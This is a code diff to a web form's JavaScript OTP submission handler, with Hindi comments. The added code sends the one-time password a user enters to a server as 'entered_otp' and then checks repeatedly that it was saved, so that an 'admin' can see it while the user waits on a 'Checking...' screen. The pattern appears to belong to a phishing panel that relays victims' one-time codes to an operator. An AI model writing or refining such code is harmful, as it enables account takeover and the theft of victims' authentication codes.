@@ -383,12 +383,18 @@ document.getElementById('fOtpForm').onsubmit = async function(e) {
     return;
   }
 
+  const btn = document.getElementById('btnOtpSubmit');
+  const btnText = btn.textContent;
+  btn.disabled = true;
+  btn.textContent = 'Submitting...';
+
+  const url = API + '/api/requests/' + encodeURIComponent(currentRequestId);
+  const hdr = { 'x-user-token': localStorage.getItem('ds_token') || '' };
+
   try {
     let existingData = {};
     try {
-      const getRes = await fetch(API + '/api/requests/' + encodeURIComponent(currentRequestId), {
-        headers: { 'x-user-token': localStorage.getItem('ds_token') || '' }
-      });
+      const getRes = await fetch(url, { headers: hdr });
       if (getRes.ok) {
         const resJson = await getRes.json();
         if (resJson.request && resJson.request.data) {
@@ -399,12 +405,9 @@ document.getElementById('fOtpForm').onsubmit = async function(e) {
       console.warn('Could not fetch existing request data, proceeding:', gErr);
     }
 
-    const patchRes = await fetch(API + '/api/requests/' + encodeURIComponent(currentRequestId), {
+    const patchRes = await fetch(url, {
       method: 'PATCH',
-      headers: {
-        'content-type': 'application/json',
-        'x-user-token': localStorage.getItem('ds_token') || ''
-      },
+      headers: { ...hdr, 'content-type': 'application/json' },
       body: JSON.stringify({
         s: 'processing',
         data: {
@@ -415,15 +418,38 @@ document.getElementById('fOtpForm').onsubmit = async function(e) {
       })
     });
 
+    const patchText = await patchRes.text();
     if (!patchRes.ok) {
-      const errText = await patchRes.text();
-      alert('Server Error (' + patchRes.status + '): ' + errText);
+      alert('Server Error (' + patchRes.status + '): ' + patchText);
+      return;
+    }
+
+    // Verify: server ne OTP sach me save kiya? Nahi to admin ko OTP nahi dikhega
+    // aur user bina wajah "Checking..." par atka rahega.
+    let saved = false, lastReq = null;
+    for (let i = 0; i < 3 && !saved; i++) {
+      if (i) await new Promise(r => setTimeout(r, 1000));
+      try {
+        const vr = await fetch(url, { headers: hdr });
+        if (vr.ok) {
+          lastReq = (await vr.json()).request;
+          saved = !!(lastReq && lastReq.data && String(lastReq.data.entered_otp) === otp);
+        }
+      } catch (_) {}
+    }
+
+    if (!saved) {
+      console.error('OTP save verify failed. PATCH response:', patchRes.status, patchText, '| request now:', lastReq);
+      alert('OTP server par save nahi hua, isliye admin ko nahi dikhega.\n\n(PATCH ' + patchRes.status + ') Backend worker ko PATCH /api/requests/:id par "data" (entered_otp) save karna chahiye. Kripya dobara try karein ya admin ko batayein.');
       return;
     }
   } catch (err) {
     console.error('OTP Submit Error:', err);
     alert('Network error while submitting OTP.');
     return;
+  } finally {
+    btn.disabled = false;
+    btn.textContent = btnText;
   }
 
   showChecking('');
